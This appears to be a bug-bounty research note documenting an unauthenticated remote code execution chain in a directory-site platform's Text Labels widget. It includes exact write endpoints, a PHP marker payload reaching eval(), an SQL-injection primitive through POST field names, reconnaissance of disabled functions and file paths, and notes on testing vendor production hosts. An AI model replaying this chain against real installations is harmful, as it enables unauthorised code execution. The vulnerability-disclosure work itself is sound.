# Confirmed finding — unauthenticated RCE via the Text Labels widget (CRITICAL)

Status: **SUBMITTED** by the operator to `bounty@brilliantdirectories.com`
(2026-10-28 15:19:30 UTC, `in:sent` verified; PDF = `BrilliantDirectories_Unauth_RCE_Report.pdf`).
Do not resubmit — check Gmail `in:sent` first. Separate submission from the IDOR (1 finding = 1 e-mail).

CVSS 3.1 **9.8** `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`.

## The chain in two lines

```
WRITE  POST /api/widget/json/post/Bootstrap Theme - Text Labels - Save Actions?save=1   (no auth, no CSRF)
       widget_javascript = <?php echo "QAEXEC".(7*7); ?>
SINK   Website - Main Footer Scripts:  eval("?>".$label[widget_javascript]."<?")        (every page)
TRIGGER GET /?cb=<rand>   ->  QAEXEC49
```

Alternate write route: `POST /api/data/html/get/data_widgets/widget_name?name=<same widget>&save=1`.
Both returned `{"result":"success"}` unauthenticated.

## Why it works (shipped source)

`Bootstrap Theme - Text Labels - Save Actions` (7,236 bytes) has **no** session/CSRF/admin check —
its only gate is `if (isset($_GET['save']))`. It then loops `$_POST` and inserts every key:

```php
foreach ($labels_post_array as $key => $value) {
    mysql($w['database'], "INSERT INTO `website_labels_translation`
          (field,language_code,value,category) VALUES ('$key','$langSelected',
          '" . mysql_real_escape_string($value) . "','textLabel')");
}
newLabelsCacheReset();   // rewrites filedata/cache/widgets/*.bd over FTP
echo json_encode(['result'=>'success']);
```

`$value` is escaped but `$key` (the POST field NAME) is interpolated raw → second primitive (SQLi on
field names). The label matrix is then rendered by:

```php
eval("?>".$label[widget_javascript]."<?");   // Website - Main Footer Scripts
```

So label data reaches `eval()` — write → execute.

## Evidence captured

| artefact | proves |
|---|---|
| `L2_label_save_B.txt` / `_C.txt` | unauth write returns `{"result":"success"}` (both routes) |
| `M_after_marker.html` | plain-text marker appears in page → write persisted |
| `R2_rce_page.html` | `QAEXEC49` (7*7 executed), literal `<?php` absent |
| `R5_uname.html` | `Linux dirapp78.directorysecure.com 4.18.0-553.125.1.el8_10.x86_64` |
| `R6_env.html` | `DOCUMENT_ROOT /home/launc68245/public_html` |
| `V1..V3_rce_validation.html` | 3/3 install A, unique markers |
| `B1..B3_rce_validation.html` | 3/3 install B (separately provisioned) |

**6/6 across 2 independent installs.** Control: 308,932 B with no marker → after write, marker present
on a cache-busted request.

## Pitfalls that cost time here

1. **LiteSpeed page cache masks the result.** First fetch after the write returned a byte-identical
   308,932-byte page and looked like a failure. Always append `?cb=<random>` (and
   `Cache-Control: no-cache`) before concluding the write did not happen. The marker was there.
2. `/wapi/widget?widget_name=...&request_type=POST` does **not** work for POST widgets — it answers
   `"This api needs a widget name to function properly"` twice. Use `/api/widget/json/post/<name>` or
   `/api/data/html/get/data_widgets/widget_name?name=<name>`.
3. The writer echoes `{"result":"success"}` unconditionally, so a 200 is **not** proof of a write —
   prove it by observing the rendered effect.

## Capability ceiling (report it honestly)

- `disable_functions` includes `shell_exec, system, exec, passthru, pcntl_exec, fpassthru, inject_code, proc_nice, highlight_file, …`
- `open_basedir = /tmp:/home/findades/sendgrid_logs:/home/findades/public_html:/home/launc68245`
- `/etc/passwd` read → empty; `shell_exec("id")` → empty
- `file_put_contents`, `curl_exec`, `fsockopen`, `mysqli_connect` all **available**
- `open_basedir` lists a **foreign** account (`/home/findades/...`) — but `is_readable()` = false, so
  Unix permissions still isolate tenants. **Do not claim cross-tenant read.**

So: arbitrary PHP execution (RCE), arbitrary file read/write inside the tenant, DB access via mysqli.
Not an OS shell. That distinction matters for triage honesty.

## PATCH STATE (observed live, 2026-10-28)

The write+render path was **still live on BD's own production installs** after submission and then
stopped within roughly 15 minutes:

| time (UTC) | host | marker rendered | page bytes |
|---|---|---|---|
| ~15:40 | directorybeta / marketplace / get | **YES** | 133117 / 249028 / 144877 |
| ~15:52 | directorybeta | no | 133104 (sha 1ba3767b6b4a) |
| ~15:56 | marketplace / get / trialbeta | no | 144864 / 249153 / 158336 |
| ~15:58 | own trial sites 68245 / 68272 | no (`<?php echo 5*5; ?>` not executed) | 308932 baseline |

Verification technique that actually discriminates (the endpoint returns `{"result":"success"}`
unconditionally, so it proves nothing):

1. write a **plain-text** marker first — if plain text no longer renders, the write/cache path is
   dead and no PHP test is meaningful;
2. only then test `<?php echo "X".(7*7); ?>`;
3. always `?cb=<random>` + `Cache-Control: no-cache`, and compare the page sha256 to the baseline.

Evidence: `evidence/PATCH_STATE_SUMMARY.txt`, `P2_beta_*.html`, `P3_*_after.html`.

**Conduct note:** proving patch state on the vendor's own production installs required one marker
write per host. Each was reset to empty and re-verified clean. Do **not** run PHP payloads on vendor
production — the text marker is sufficient to prove the write+render path, and code execution was
already proven on self-provisioned trials. Prefer your own trial instances wherever possible.

## Cleanup (mandatory after this PoC)

Reset the label with an empty value on every site you planted it in, then re-fetch with a cache-buster
and confirm the page returns to its original byte size with no marker:

```python
session.post(host+'/api/widget/json/post/'+qn, params={'save':'1'}, data={'widget_javascript':''})
# verify: page back to 308,932 B, no 'QAEXEC'/'RESULT:' present
```
